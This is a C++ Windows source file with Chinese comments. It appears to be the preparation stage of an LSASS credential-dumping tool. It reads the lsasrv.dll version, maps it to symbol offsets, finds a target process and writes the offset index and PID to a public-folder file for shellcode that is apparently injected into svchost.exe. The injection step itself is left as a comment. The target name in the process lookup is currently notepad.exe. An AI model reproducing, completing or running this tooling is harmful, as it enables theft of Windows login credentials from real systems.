#include <Windows.h>
#include <tchar.h>
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <userenv.h>
#define TABLE_LENGTH 1024
bool FBFileExists(const char* szPath) {
	DWORD dwAttrib = GetFileAttributesA(szPath);
	return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
		!(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}
#pragma comment(lib, "Version.lib")
char version_table[TABLE_LENGTH][50] = {
	"10.0.19041.1",
	"10.0.19041.2913"
};
DWORD offset_table[TABLE_LENGTH] = {
	0x32BC3,
	0x1FA63
};
void getosversion(char* result) {
	char buffer[1024] = { 0 };
	char PATH[1024] = "C:\\windows\\system32\\lsasrv.dll";
	GetFileVersionInfoA(PATH,
		NULL,
		1024,
		(LPVOID)buffer);
	//	printf("%s\n", buffer);
		// 这很简单，遍历这个buffer，直到找到FileVersion的unicode版本就行了
		// 字节序里,长度22
	int result_counter = 0;
	byte asdasdasdbyte[1024] = { 0x46,0x00,0x69,0x00,0x6c,0x00,0x65,0x00,0x56,0x00,0x65,0x00,0x72,0x00,0x73,0x00,0x69,0x00,0x6f,0x00,0x6e,0x00 };
	for (int i = 0; i < 1024; i++) {
		// 相等则说明已经遍历到了fileversion字符串了
		if (0 == memcmp(buffer + i, asdasdasdbyte, 22)) {
			// 往后偏移四个字节就是版本号了
			char* versionoffset = buffer + i + 22 + 4;
			// 这个版本号其实就是一个unicode字符串，往后遍历，一直遍历到两个0就行了
			byte terminator[1024] = { 0x0,0x0 };
			int first = 1;
			for (int gi = 0; gi < 1024; gi++) {
				if (0 == memcmp(versionoffset + gi, terminator, 2)) {
					// 遍历完成，返回就行了
					return;
				}
				if (*(versionoffset + gi) != 0) {
					char _1[2] = { 0 };
					sprintf_s(_1, "%s", versionoffset + gi);
					if (first == 1) {
						//strcpy_s(result,2, _1);
						memcpy_s(result + result_counter, 100, _1, 1);
						result_counter += 1;
						first = 0;
					}
					else {
						//strcat_s(result+1,2, _1);
						memcpy_s(result + result_counter, 100, _1, 1);
						result_counter += 1;
					}
				}
			}
		}
	}
}


int GetLsassPid() {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (Process32First(hSnapshot, &entry)) {
		while (Process32Next(hSnapshot, &entry)) {
			if (wcscmp(entry.szExeFile, L"notepad.exe") == 0) {
				return entry.th32ProcessID;
			}
		}
	}
	CloseHandle(hSnapshot);
	return 0;
}


int main(int argc, char** argv)
{
	DWORD pid = GetLsassPid();
	// 我需要先获取lsasrv.dll的版本信息，从而得到关键的3个符号的偏移量信息
	char* res = (char*)malloc(50);
	ZeroMemory(res, 50);
	getosversion(res);
	//printf("%s\n", res);
		// 遍历到第一个空格
	for (int i = 0; i < 1234; i++) {
		if (res[i] == ' ') {
			// 在这里断掉
			res[i] = '\0'; break;
		}
	}
	printf("[*] version: %s\n", res);
	DWORD offset = 0;
	for (int i = 0; i < TABLE_LENGTH; i++) {
		if (strcmp(res, version_table[i]) == 0) {
			offset = offset_table[i];
			// 记录下来这个索引，写入到文件中，供注入到svchost.exe进程中的shellcode去读取
			char write_out[123] = { 0 };
			sprintf_s(write_out,123, "%03d", i);
			sprintf_s(write_out+3,120, "%07d", pid);
			FILE* fptr;
			if (FBFileExists("C:\\users\\public\\ili6ao"))DeleteFileA("C:\\users\\public\\ili6ao");
			// Open a file in writing mode
			fopen_s(&fptr, "C:\\users\\public\\ili6ao", "w");

			// Write some text to the file
			fprintf(fptr, write_out);

			// Close the file
			fclose(fptr);
			break;
		}
	}
	if (!offset) {
		printf("[-] unknown version, abort...\n");
		free(res);
		exit(-1);
	}
	free(res);
	// 将shellcode写入目标进程内存并启动shellcode



	exit(-1);
}
